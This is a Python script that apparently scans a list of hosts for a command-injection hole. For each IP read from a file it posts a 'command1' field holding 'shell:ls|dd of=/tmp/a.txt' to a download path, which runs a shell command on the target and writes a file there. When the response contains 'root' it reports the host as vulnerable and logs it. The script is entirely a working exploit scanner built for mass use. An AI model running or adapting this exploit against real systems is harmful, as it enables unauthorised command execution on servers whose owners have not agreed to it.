import requests
import sys
import datetime



def CheckVuln(host):
    vurl = host+'/(download)/tmp/a.txt'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36','Connection': 'close'}
    data = {'command1':'shell:ls|dd of=/tmp/a.txt'}
    try:
        req = requests.post(url=vurl,data=data,verify=False,headers=headers,timeout=1)
        
        if req.status_code ==200 and 'root' in req.text:
            T = ('[*]-'+host+'-----Vulnerable!')
            print(T)
            OutPut(T)
        else:
            T = ('[-]-'+host+'-----Not Vulnnerable')
            print(T)
            OutPut(T)

    except:
        T = host+'[-]-----Network Error'
        print(T)
        OutPut(T)

def OutPut(F):
    time =  datetime.datetime.now().strftime('%Y-%m-%d')
    #print(time)
    f = open(time+'.txt','a')
    f.write(F + '\n') 
    f.close()
            
def GetUrl(path):
    with open(path,'r',encoding='utf-8') as f:
        for i in f:
            if i.strip() != '':
                oldh = i.strip() 
                #print(oldh)
                host = 'http://'+oldh
                CheckVuln(host)
               
            else:
                print(path+'Empty File')

if len(sys.argv) != 2:
    print('-------------Use:python3 Check.py ip.txt----------------- ')
    sys.exit()

path = sys.argv[1]

GetUrl(path)

        


    
